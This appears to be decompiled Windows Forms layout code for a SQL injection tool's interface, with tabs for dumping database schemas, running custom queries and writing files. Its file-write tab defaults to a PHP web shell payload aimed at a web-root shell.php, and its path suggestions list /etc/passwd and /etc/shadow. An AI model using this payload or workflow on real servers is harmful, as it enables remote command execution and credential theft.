		this.mnuCountRowsAll.Size = new System.Drawing.Size(229, 30);
		this.mnuCountRowsAll.Text = "Count All Rows";
		this.mnuCountSP.Name = "mnuCountSP";
		this.mnuCountSP.Size = new System.Drawing.Size(226, 6);
		this.mnuCopyDB.Name = "mnuCopyDB";
		this.mnuCopyDB.Size = new System.Drawing.Size(229, 30);
		this.mnuCopyDB.Text = "Clipboard Database";
		this.mnuCopyColumn.Name = "mnuCopyColumn";
		this.mnuCopyColumn.Size = new System.Drawing.Size(229, 30);
		this.mnuCopyColumn.Text = "Clipboard Column";
		this.mnuCopyTable.Name = "mnuCopyTable";
		this.mnuCopyTable.Size = new System.Drawing.Size(229, 30);
		this.mnuCopyTable.Text = "Clipboard Table";
		this.mnuCheckAllSP.Name = "mnuCheckAllSP";
		this.mnuCheckAllSP.Size = new System.Drawing.Size(226, 6);
		this.mnuCheckAllColumns.Name = "mnuCheckAllColumns";
		this.mnuCheckAllColumns.Size = new System.Drawing.Size(229, 30);
		this.mnuCheckAllColumns.Text = "Check All Columns";
		this.mnuUnCheckAllColumns.Name = "mnuUnCheckAllColumns";
		this.mnuUnCheckAllColumns.Size = new System.Drawing.Size(229, 30);
		this.mnuUnCheckAllColumns.Text = "UnCheck All Columns";
		this.mnuCheckRevert.Name = "mnuCheckRevert";
		this.mnuCheckRevert.Size = new System.Drawing.Size(229, 30);
		this.mnuCheckRevert.Text = "Revert All Columns";
		this.mnuTreeSP1.Name = "mnuTreeSP1";
		this.mnuTreeSP1.Size = new System.Drawing.Size(226, 6);
		this.mnuCopyAllNodes.Name = "mnuCopyAllNodes";
		this.mnuCopyAllNodes.Size = new System.Drawing.Size(229, 30);
		this.mnuCopyAllNodes.Text = "Clipboard All Nodes";
		this.mnuCopyAllSchema.Name = "mnuCopyAllSchema";
		this.mnuCopyAllSchema.Size = new System.Drawing.Size(229, 30);
		this.mnuCopyAllSchema.Text = "Clipboard All Schema";
		this.mnuTreeSP2.Name = "mnuTreeSP2";
		this.mnuTreeSP2.Size = new System.Drawing.Size(226, 6);
		this.mnuClearNodes.Name = "mnuClearNodes";
		this.mnuClearNodes.Size = new System.Drawing.Size(229, 30);
		this.mnuClearNodes.Text = "Clear Node";
		this.mnuClearSchema.Name = "mnuClearSchema";
		this.mnuClearSchema.Size = new System.Drawing.Size(229, 30);
		this.mnuClearSchema.Text = "Clear All Schema";
		this.mnuTreeSP3.Name = "mnuTreeSP3";
		this.mnuTreeSP3.Size = new System.Drawing.Size(226, 6);
		this.mnuRemDB.Name = "mnuRemDB";
		this.mnuRemDB.Size = new System.Drawing.Size(229, 30);
		this.mnuRemDB.Text = "Rem Database";
		this.mnuRemTable.Name = "mnuRemTable";
		this.mnuRemTable.Size = new System.Drawing.Size(229, 30);
		this.mnuRemTable.Text = "Rem Table";
		this.mnuRemColumn.Name = "mnuRemColumn";
		this.mnuRemColumn.Size = new System.Drawing.Size(229, 30);
		this.mnuRemColumn.Text = "Rem Column";
		this.mnuTreeSP5.Name = "mnuTreeSP5";
		this.mnuTreeSP5.Size = new System.Drawing.Size(226, 6);
		this.mnuAddDB.Name = "mnuAddDB";
		this.mnuAddDB.Size = new System.Drawing.Size(229, 30);
		this.mnuAddDB.Text = "Add Database";
		this.mnuAddTable.Name = "mnuAddTable";
		this.mnuAddTable.Size = new System.Drawing.Size(229, 30);
		this.mnuAddTable.Text = "Add Table";
		this.mnuAddColumn.Name = "mnuAddColumn";
		this.mnuAddColumn.Size = new System.Drawing.Size(229, 30);
		this.mnuAddColumn.Text = "Add Column";
		this.mnuTreeSP4.Name = "mnuTreeSP4";
		this.mnuTreeSP4.Size = new System.Drawing.Size(226, 6);
		this.mnuCollapseTree.Name = "mnuCollapseTree";
		this.mnuCollapseTree.Size = new System.Drawing.Size(229, 30);
		this.mnuCollapseTree.Text = "Collapse Tree";
		this.mnuSortTree.Name = "mnuSortTree";
		this.mnuSortTree.Size = new System.Drawing.Size(229, 30);
		this.mnuSortTree.Text = "Sort Tree";
		this.mnuAutoScroll.Name = "mnuAutoScroll";
		this.mnuAutoScroll.Size = new System.Drawing.Size(229, 30);
		this.mnuAutoScroll.Text = "Auto Scroll: Yes";
		this.imgTV.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imgTV.ImageStream");
		this.imgTV.TransparentColor = System.Drawing.Color.White;
		this.imgTV.Images.SetKeyName(0, "Database_16x_24.bmp");
		this.imgTV.Images.SetKeyName(1, "Table_16x_24.bmp");
		this.imgTV.Images.SetKeyName(2, "Column_16x_24.bmp");
		this.imgTV.Images.SetKeyName(3, "dataType.ico");
		this.splWhere.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splWhere.Location = new System.Drawing.Point(0, 32);
		this.splWhere.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.splWhere.Name = "splWhere";
		this.splWhere.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splWhere.Panel1.Controls.Add(this.grbWhere);
		this.splWhere.Panel2.Controls.Add(this.grbOrderBy);
		this.splWhere.Size = new System.Drawing.Size(200, 1183);
		this.splWhere.SplitterDistance = 641;
		this.splWhere.SplitterWidth = 6;
		this.splWhere.TabIndex = 23;
		this.grbWhere.Controls.Add(this.txtSchemaWhere);
		this.grbWhere.Dock = System.Windows.Forms.DockStyle.Fill;
		this.grbWhere.ForeColor = System.Drawing.SystemColors.ControlText;
		this.grbWhere.Location = new System.Drawing.Point(0, 0);
		this.grbWhere.Name = "grbWhere";
		this.grbWhere.Size = new System.Drawing.Size(200, 641);
		this.grbWhere.TabIndex = 19;
		this.grbWhere.TabStop = false;
		this.grbWhere.Text = "Where (Field Value)";
		this.txtSchemaWhere.BackColor = System.Drawing.SystemColors.Window;
		this.txtSchemaWhere.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtSchemaWhere.Enabled = false;
		this.txtSchemaWhere.Font = new System.Drawing.Font("Courier New", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.txtSchemaWhere.Location = new System.Drawing.Point(3, 22);
		this.txtSchemaWhere.Multiline = true;
		this.txtSchemaWhere.Name = "txtSchemaWhere";
		this.txtSchemaWhere.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtSchemaWhere.Size = new System.Drawing.Size(194, 616);
		this.txtSchemaWhere.TabIndex = 0;
		this.txtSchemaWhere.Text = "1=1 or not 1=0";
		this.grbOrderBy.Controls.Add(this.txtSchemaOrderBy);
		this.grbOrderBy.Dock = System.Windows.Forms.DockStyle.Fill;
		this.grbOrderBy.ForeColor = System.Drawing.SystemColors.ControlText;
		this.grbOrderBy.Location = new System.Drawing.Point(0, 0);
		this.grbOrderBy.Name = "grbOrderBy";
		this.grbOrderBy.Size = new System.Drawing.Size(200, 536);
		this.grbOrderBy.TabIndex = 20;
		this.grbOrderBy.TabStop = false;
		this.grbOrderBy.Text = "Order By (Field ASC/DESC)";
		this.txtSchemaOrderBy.BackColor = System.Drawing.SystemColors.Window;
		this.txtSchemaOrderBy.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtSchemaOrderBy.Enabled = false;
		this.txtSchemaOrderBy.Font = new System.Drawing.Font("Courier New", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.txtSchemaOrderBy.Location = new System.Drawing.Point(3, 22);
		this.txtSchemaOrderBy.Multiline = true;
		this.txtSchemaOrderBy.Name = "txtSchemaOrderBy";
		this.txtSchemaOrderBy.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtSchemaOrderBy.Size = new System.Drawing.Size(194, 511);
		this.txtSchemaOrderBy.TabIndex = 0;
		this.txtSchemaOrderBy.Text = "1 asc, 2 desc";
		this.tsConvert1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsConvert1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsConvert1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.btnFiltersClear1, this.btnConvert, this.ToolStripDropDownButton1 });
		this.tsConvert1.Location = new System.Drawing.Point(0, 0);
		this.tsConvert1.Name = "tsConvert1";
		this.tsConvert1.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsConvert1.ShowItemToolTips = false;
		this.tsConvert1.Size = new System.Drawing.Size(200, 32);
		this.tsConvert1.TabIndex = 21;
		this.tsConvert1.Text = "ToolStrip3";
		this.btnFiltersClear1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnFiltersClear1.Image = ns0.Class6.delete;
		this.btnFiltersClear1.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnFiltersClear1.Name = "btnFiltersClear1";
		this.btnFiltersClear1.Size = new System.Drawing.Size(28, 29);
		this.btnFiltersClear1.Text = "Clear Query";
		this.btnConvert.DropDown = this.ctmConvert;
		this.btnConvert.Image = ns0.Class6.ChartFilter_16x_24;
		this.btnConvert.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnConvert.Name = "btnConvert";
		this.btnConvert.Size = new System.Drawing.Size(116, 29);
		this.btnConvert.Text = "&Convert";
		this.ctmConvert.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmConvert.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.mnuConvHex, this.mnuConvChar, this.mnuConvCharGroup, this.ToolStripMenuItem2, this.mnuConvLEN, this.mnuConvAddA });
		this.ctmConvert.Name = "mnuListView";
		this.ctmConvert.OwnerItem = this.btnConvert;
		this.ctmConvert.ShowImageMargin = false;
		this.ctmConvert.ShowItemToolTips = false;
		this.ctmConvert.Size = new System.Drawing.Size(238, 160);
		this.mnuConvHex.Name = "mnuConvHex";
		this.mnuConvHex.Size = new System.Drawing.Size(237, 30);
		this.mnuConvHex.Text = "To Hex";
		this.mnuConvChar.Name = "mnuConvChar";
		this.mnuConvChar.Size = new System.Drawing.Size(237, 30);
		this.mnuConvChar.Text = "To Char";
		this.mnuConvCharGroup.Name = "mnuConvCharGroup";
		this.mnuConvCharGroup.Size = new System.Drawing.Size(237, 30);
		this.mnuConvCharGroup.Text = "To Group Char";
		this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(234, 6);
		this.mnuConvLEN.Name = "mnuConvLEN";
		this.mnuConvLEN.Size = new System.Drawing.Size(237, 30);
		this.mnuConvLEN.Text = "LEN() OR LENGHT";
		this.mnuConvAddA.Name = "mnuConvAddA";
		this.mnuConvAddA.Size = new System.Drawing.Size(237, 30);
		this.mnuConvAddA.Text = "Add enconded '%@%'";
		this.mnuConvert.DropDown = this.ctmConvert;
		this.mnuConvert.Image = ns0.Class6.ChartFilter_16x_24;
		this.mnuConvert.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.mnuConvert.Name = "mnuConvert";
		this.mnuConvert.Size = new System.Drawing.Size(116, 29);
		this.mnuConvert.Text = "&Convert";
		this.ToolStripDropDownButton1.DropDown = this.ctmSchema;
		this.ToolStripDropDownButton1.Image = ns0.Class6.Template_16x_24;
		this.ToolStripDropDownButton1.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.ToolStripDropDownButton1.Name = "ToolStripDropDownButton1";
		this.ToolStripDropDownButton1.Size = new System.Drawing.Size(102, 29);
		this.ToolStripDropDownButton1.Text = "&Query";
		this.ctmSchema.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.ctmSchema.Items.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.mnuSchema0, this.mnuSchema1, this.mnuSchema2, this.mnuSchema3, this.mnuSchema4, this.mnuSchema5, this.mnuSchema6, this.mnuSchema7, this.mnuSchema8, this.mnuSchema9 });
		this.ctmSchema.Name = "mnuListView";
		this.ctmSchema.OwnerItem = this.ToolStripDropDownButton1;
		this.ctmSchema.ShowImageMargin = false;
		this.ctmSchema.Size = new System.Drawing.Size(220, 304);
		this.mnuSchema0.Name = "mnuSchema0";
		this.mnuSchema0.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema0.Text = "information_schema";
		this.mnuSchema1.Name = "mnuSchema1";
		this.mnuSchema1.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema1.Text = "   schema";
		this.mnuSchema2.Name = "mnuSchema2";
		this.mnuSchema2.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema2.Text = "      schema_name";
		this.mnuSchema3.Name = "mnuSchema3";
		this.mnuSchema3.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema3.Text = "   tables";
		this.mnuSchema4.Name = "mnuSchema4";
		this.mnuSchema4.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema4.Text = "      table_name";
		this.mnuSchema5.Name = "mnuSchema5";
		this.mnuSchema5.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema5.Text = "      table_schema";
		this.mnuSchema6.Name = "mnuSchema6";
		this.mnuSchema6.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema6.Text = "   columns";
		this.mnuSchema7.Name = "mnuSchema7";
		this.mnuSchema7.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema7.Text = "      column_name";
		this.mnuSchema8.Name = "mnuSchema8";
		this.mnuSchema8.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema8.Text = "      table_schema";
		this.mnuSchema9.Name = "mnuSchema9";
		this.mnuSchema9.Size = new System.Drawing.Size(219, 30);
		this.mnuSchema9.Text = "      table_name";
		this.ToolStripMenuItem12.DropDown = this.ctmSchema;
		this.ToolStripMenuItem12.Name = "ToolStripMenuItem12";
		this.ToolStripMenuItem12.Size = new System.Drawing.Size(293, 30);
		this.ToolStripMenuItem12.Text = "information_schema";
		this.tsSchema.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSchema.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSchema.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.lblCountBDs, this.ToolStripSeparator22, this.btnClearSchema, this.ToolStripSeparator13, this.btnDataBases, this.ToolStripSeparator5, this.btnTables, this.btnColumns, this.btnColumnUp, this.btnColumnDown,
			this.btnDumpData
		});
		this.tsSchema.Location = new System.Drawing.Point(3, 3);
		this.tsSchema.Name = "tsSchema";
		this.tsSchema.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSchema.ShowItemToolTips = false;
		this.tsSchema.Size = new System.Drawing.Size(1385, 32);
		this.tsSchema.TabIndex = 0;
		this.tsSchema.Text = "ToolStrip1";
		this.lblCountBDs.ForeColor = System.Drawing.Color.Gray;
		this.lblCountBDs.Name = "lblCountBDs";
		this.lblCountBDs.Size = new System.Drawing.Size(29, 29);
		this.lblCountBDs.Text = "-1";
		this.ToolStripSeparator22.Name = "ToolStripSeparator22";
		this.ToolStripSeparator22.Size = new System.Drawing.Size(6, 32);
		this.btnClearSchema.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnClearSchema.Image = ns0.Class6.delete;
		this.btnClearSchema.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnClearSchema.Name = "btnClearSchema";
		this.btnClearSchema.Size = new System.Drawing.Size(28, 29);
		this.btnClearSchema.Text = "Clear Schema";
		this.ToolStripSeparator13.Name = "ToolStripSeparator13";
		this.ToolStripSeparator13.Size = new System.Drawing.Size(6, 32);
		this.btnDataBases.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnDataBases.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnDataBases.Name = "btnDataBases";
		this.btnDataBases.Size = new System.Drawing.Size(130, 29);
		this.btnDataBases.Text = "Get &Databases";
		this.ToolStripSeparator5.Name = "ToolStripSeparator5";
		this.ToolStripSeparator5.Size = new System.Drawing.Size(6, 32);
		this.btnTables.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnTables.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnTables.Name = "btnTables";
		this.btnTables.Size = new System.Drawing.Size(96, 29);
		this.btnTables.Text = "Get &Tables";
		this.btnTables.Visible = false;
		this.btnColumns.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnColumns.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnColumns.Name = "btnColumns";
		this.btnColumns.Size = new System.Drawing.Size(118, 29);
		this.btnColumns.Text = "Get &Columns";
		this.btnColumns.Visible = false;
		this.btnColumnUp.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnColumnUp.Image = ns0.Class6.Upload_gray_inverse_16x_24;
		this.btnColumnUp.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnColumnUp.Name = "btnColumnUp";
		this.btnColumnUp.Size = new System.Drawing.Size(28, 29);
		this.btnColumnUp.Text = "Move Column Up";
		this.btnColumnUp.Visible = false;
		this.btnColumnDown.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnColumnDown.Image = ns0.Class6.Download_grey_inverse_24;
		this.btnColumnDown.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnColumnDown.Name = "btnColumnDown";
		this.btnColumnDown.Size = new System.Drawing.Size(28, 29);
		this.btnColumnDown.Text = "Move Column Down";
		this.btnColumnDown.Visible = false;
		this.btnDumpData.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnDumpData.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnDumpData.Image = ns0.Class6.Run_16x_24;
		this.btnDumpData.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnDumpData.Name = "btnDumpData";
		this.btnDumpData.Size = new System.Drawing.Size(132, 29);
		this.btnDumpData.Text = "D&ump Data";
		this.btnDumpData.Visible = false;
		this.tpQuery.Controls.Add(this.splQuery);
		this.tpQuery.Controls.Add(this.tsCustomDump);
		this.tpQuery.ImageIndex = 1;
		this.tpQuery.Location = new System.Drawing.Point(4, 29);
		this.tpQuery.Name = "tpQuery";
		this.tpQuery.Padding = new System.Windows.Forms.Padding(3);
		this.tpQuery.Size = new System.Drawing.Size(1391, 1253);
		this.tpQuery.TabIndex = 1;
		this.tpQuery.Text = "Query";
		this.tpQuery.UseVisualStyleBackColor = true;
		this.splQuery.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splQuery.Location = new System.Drawing.Point(3, 35);
		this.splQuery.Name = "splQuery";
		this.splQuery.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splQuery.Panel1.Controls.Add(this.txtCustomQuery);
		this.splQuery.Panel1.Controls.Add(this.lblSelect);
		this.splQuery.Panel2.Controls.Add(this.txtCustomQueryFrom);
		this.splQuery.Panel2.Controls.Add(this.lblFrom);
		this.splQuery.Size = new System.Drawing.Size(1385, 1215);
		this.splQuery.SplitterDistance = 572;
		this.splQuery.SplitterWidth = 2;
		this.splQuery.TabIndex = 18;
		this.txtCustomQuery.BackColor = System.Drawing.SystemColors.Window;
		this.txtCustomQuery.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtCustomQuery.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtCustomQuery.Location = new System.Drawing.Point(134, 0);
		this.txtCustomQuery.Multiline = true;
		this.txtCustomQuery.Name = "txtCustomQuery";
		this.txtCustomQuery.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.txtCustomQuery.Size = new System.Drawing.Size(1251, 572);
		this.txtCustomQuery.TabIndex = 0;
		this.txtCustomQuery.TabStop = false;
		this.txtCustomQuery.WordWrap = false;
		this.lblSelect.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.lblSelect.Dock = System.Windows.Forms.DockStyle.Left;
		this.lblSelect.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblSelect.Location = new System.Drawing.Point(0, 0);
		this.lblSelect.Name = "lblSelect";
		this.lblSelect.Size = new System.Drawing.Size(134, 572);
		this.lblSelect.TabIndex = 3;
		this.lblSelect.Text = "SELECT";
		this.lblSelect.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.txtCustomQueryFrom.BackColor = System.Drawing.SystemColors.Window;
		this.txtCustomQueryFrom.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtCustomQueryFrom.Font = new System.Drawing.Font("Courier New", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtCustomQueryFrom.Location = new System.Drawing.Point(134, 0);
		this.txtCustomQueryFrom.Multiline = true;
		this.txtCustomQueryFrom.Name = "txtCustomQueryFrom";
		this.txtCustomQueryFrom.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.txtCustomQueryFrom.Size = new System.Drawing.Size(1251, 641);
		this.txtCustomQueryFrom.TabIndex = 0;
		this.txtCustomQueryFrom.TabStop = false;
		this.txtCustomQueryFrom.WordWrap = false;
		this.lblFrom.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.lblFrom.Dock = System.Windows.Forms.DockStyle.Left;
		this.lblFrom.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblFrom.Location = new System.Drawing.Point(0, 0);
		this.lblFrom.Name = "lblFrom";
		this.lblFrom.Size = new System.Drawing.Size(134, 641);
		this.lblFrom.TabIndex = 2;
		this.lblFrom.Text = "FROM";
		this.lblFrom.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.lblFrom.Visible = false;
		this.tsCustomDump.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsCustomDump.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsCustomDump.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.btnDumpCustom, this.btnDefCustomQuery, this.ToolStripSeparator19, this.mnuTemplates, this.ToolStripSeparator9, this.mnuConvert });
		this.tsCustomDump.Location = new System.Drawing.Point(3, 3);
		this.tsCustomDump.Name = "tsCustomDump";
		this.tsCustomDump.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsCustomDump.ShowItemToolTips = false;
		this.tsCustomDump.Size = new System.Drawing.Size(1385, 32);
		this.tsCustomDump.TabIndex = 0;
		this.tsCustomDump.Text = "ToolStrip3";
		this.btnDumpCustom.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnDumpCustom.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnDumpCustom.Image = ns0.Class6.Run_16x_24;
		this.btnDumpCustom.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnDumpCustom.Name = "btnDumpCustom";
		this.btnDumpCustom.Size = new System.Drawing.Size(152, 29);
		this.btnDumpCustom.Text = "&Execute Query";
		this.btnDefCustomQuery.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnDefCustomQuery.Image = ns0.Class6.delete;
		this.btnDefCustomQuery.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnDefCustomQuery.Name = "btnDefCustomQuery";
		this.btnDefCustomQuery.Size = new System.Drawing.Size(28, 29);
		this.btnDefCustomQuery.Text = "Defaut Query Template";
		this.ToolStripSeparator19.Name = "ToolStripSeparator19";
		this.ToolStripSeparator19.Size = new System.Drawing.Size(6, 32);
		this.mnuTemplates.Image = ns0.Class6.Template_16x_24;
		this.mnuTemplates.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.mnuTemplates.Name = "mnuTemplates";
		this.mnuTemplates.Size = new System.Drawing.Size(102, 29);
		this.mnuTemplates.Text = "&Query";
		this.ToolStripSeparator9.Name = "ToolStripSeparator9";
		this.ToolStripSeparator9.Size = new System.Drawing.Size(6, 32);
		this.tpMyLoadFile.Controls.Add(this.grbWriteFile);
		this.tpMyLoadFile.Controls.Add(this.grbLoadFile);
		this.tpMyLoadFile.ImageIndex = 2;
		this.tpMyLoadFile.Location = new System.Drawing.Point(4, 29);
		this.tpMyLoadFile.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpMyLoadFile.Name = "tpMyLoadFile";
		this.tpMyLoadFile.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpMyLoadFile.Size = new System.Drawing.Size(1391, 1253);
		this.tpMyLoadFile.TabIndex = 4;
		this.tpMyLoadFile.Text = "Load\\Write File";
		this.tpMyLoadFile.UseVisualStyleBackColor = true;
		this.grbWriteFile.Controls.Add(this.tsMySQLWriteFile);
		this.grbWriteFile.Controls.Add(this.txtMySQLWriteFile);
		this.grbWriteFile.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbWriteFile.Location = new System.Drawing.Point(4, 82);
		this.grbWriteFile.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbWriteFile.Name = "grbWriteFile";
		this.grbWriteFile.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbWriteFile.Size = new System.Drawing.Size(1383, 288);
		this.grbWriteFile.TabIndex = 12;
		this.grbWriteFile.TabStop = false;
		this.grbWriteFile.Text = "File Write (Magic Quotes Enable are required)";
		this.tsMySQLWriteFile.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.tsMySQLWriteFile.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsMySQLWriteFile.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsMySQLWriteFile.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.lblWritePath, this.txtMySQLWriteFilePath, this.ToolStripSeparator1, this.cmbMySQLWriteFilePath, this.ToolStripSeparator3, this.btnMySQLWriteFile });
		this.tsMySQLWriteFile.Location = new System.Drawing.Point(4, 250);
		this.tsMySQLWriteFile.Name = "tsMySQLWriteFile";
		this.tsMySQLWriteFile.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsMySQLWriteFile.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsMySQLWriteFile.ShowItemToolTips = false;
		this.tsMySQLWriteFile.Size = new System.Drawing.Size(1375, 33);
		this.tsMySQLWriteFile.TabIndex = 127;
		this.tsMySQLWriteFile.Text = "ToolStrip2";
		this.lblWritePath.AutoSize = false;
		this.lblWritePath.Name = "lblWritePath";
		this.lblWritePath.Size = new System.Drawing.Size(50, 19);
		this.lblWritePath.Text = "Path:";
		this.lblWritePath.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtMySQLWriteFilePath.AutoCompleteCustomSource.AddRange(new string[10] { "'/home/www/HostName_com/html/shell.php'", "'/etc/passwd/a.bin'", "'/etc/shadow/a.bin'", "'/etc/default/passwd/a.bin'", "'/etc/passwd/a.bin'", "'/etc/login.defs/a.bin'", "'/etc/group/a.bin'", "'/etc/apache2/a.bin'", "'c:\\\\a.bin'", "'c://a.bin'" });
		this.txtMySQLWriteFilePath.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtMySQLWriteFilePath.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtMySQLWriteFilePath.AutoSize = false;
		this.txtMySQLWriteFilePath.Name = "txtMySQLWriteFilePath";
		this.txtMySQLWriteFilePath.Size = new System.Drawing.Size(298, 31);
		this.txtMySQLWriteFilePath.Text = "'/home/www/HostName_com/html/shell.php'";
		this.ToolStripSeparator1.Name = "ToolStripSeparator1";
		this.ToolStripSeparator1.Size = new System.Drawing.Size(6, 33);
		this.cmbMySQLWriteFilePath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbMySQLWriteFilePath.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbMySQLWriteFilePath.Name = "cmbMySQLWriteFilePath";
		this.cmbMySQLWriteFilePath.Size = new System.Drawing.Size(180, 33);
		this.ToolStripSeparator3.Name = "ToolStripSeparator3";
		this.ToolStripSeparator3.Size = new System.Drawing.Size(6, 33);
		this.btnMySQLWriteFile.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnMySQLWriteFile.Image = ns0.Class6.Run_16x_24;
		this.btnMySQLWriteFile.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnMySQLWriteFile.Name = "btnMySQLWriteFile";
		this.btnMySQLWriteFile.Size = new System.Drawing.Size(90, 30);
		this.btnMySQLWriteFile.Text = "Write..";
		this.txtMySQLWriteFile.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtMySQLWriteFile.BackColor = System.Drawing.SystemColors.Window;
		this.txtMySQLWriteFile.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtMySQLWriteFile.Location = new System.Drawing.Point(9, 29);
		this.txtMySQLWriteFile.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtMySQLWriteFile.MaxLength = 2048;
		this.txtMySQLWriteFile.Multiline = true;
		this.txtMySQLWriteFile.Name = "txtMySQLWriteFile";
		this.txtMySQLWriteFile.Size = new System.Drawing.Size(1363, 209);
		this.txtMySQLWriteFile.TabIndex = 121;
		this.txtMySQLWriteFile.TabStop = false;
		this.txtMySQLWriteFile.Text = "'<? system($_REQUEST['cmd']); ?>'";
		this.grbLoadFile.Controls.Add(this.tsMySQLReadFile);
		this.grbLoadFile.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbLoadFile.Location = new System.Drawing.Point(4, 5);
		this.grbLoadFile.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbLoadFile.Name = "grbLoadFile";
		this.grbLoadFile.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
